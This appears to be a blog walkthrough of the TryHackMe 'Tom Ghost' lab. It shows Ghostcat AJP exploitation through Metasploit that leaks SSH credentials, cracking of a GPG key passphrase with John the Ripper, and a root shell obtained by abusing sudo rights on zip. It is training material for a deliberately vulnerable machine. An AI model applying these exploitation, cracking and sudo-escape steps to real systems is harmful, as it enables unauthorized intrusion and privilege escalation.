+++
title = "Tom Ghost - TOMCAT - Tryhackme"
date = "2025-01-31"
author = "Silent Resistor"
+++



- Thought it was difficut just by looking at the vulnerabities after nmap scan `tomghost.nmap`
- A perfectly deployed tomcat at 8080 (spent alot of time on this), and a silently hiding ghost (same tomcat) listening at 8009 for ajp packets.
- A quick scan on `searchexploit` and `msfconsole` for ajp or ghostcat quckly revelead a very good exploit. which eventually reveals ssh password for the `skyfuck` user.
```
## msfconsole: exploit:auxiliary/admin/http/tomcat_ghostcat,
 <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>
```

- Now im inside the `skyfuck` user. What i can see is a `crendentials.gpg` file encrypted with the encryption key `tryhackme.asc`
- i have tried by decrypting with `gpg`, its again asking for the passphrase for encryption key which i do not have.
- So, thought of brutforcing the passphrase for the encryption key. Lets get into the Kali
```bash
scp skyfuck@10.49.159.228:tryhackme.asc ./
/usr/sbin/gpg2hash tryhackme.asc > hash
john --format=gpg --wordlist=/usr/share/wordlist/rockyou.txt hash
# Using default input encoding: UTF-8
# Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
# Cost 1 (s2k-count) is 65536 for all loaded hashes
# Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
# Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
# Will run 3 OpenMP threads
# Press 'q' or Ctrl-C to abort, almost any other key for status
# alexandru        (tryhackme)     
# 1g 0:00:00:00 DONE (2025-12-29 14:01) 12.50g/s 13425p/s 13425c/s 13425C/s alexandru..trisha
# Use the "--show" op
```
- it turns out we found the passphrase for the encryptions key, i.e, `alexandru`
- Now, lets get more action in the `skyfuck` user of target machine
```bash
gpg --import tryhackme.asc
gpg --decrypt credentials.gpg # enter the passphrase
# gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
#       "tryhackme <stuxnet@tryhackme.com>"
# merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
- Now, we have the password for the `merlin` user
```bash
su - merling # enter the pass
cat user.txt

# privilage escalation
sudo -l # revals he has privilages on zip 
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
id # reveals now you are root
cat /root/root.txt
```
- That's it
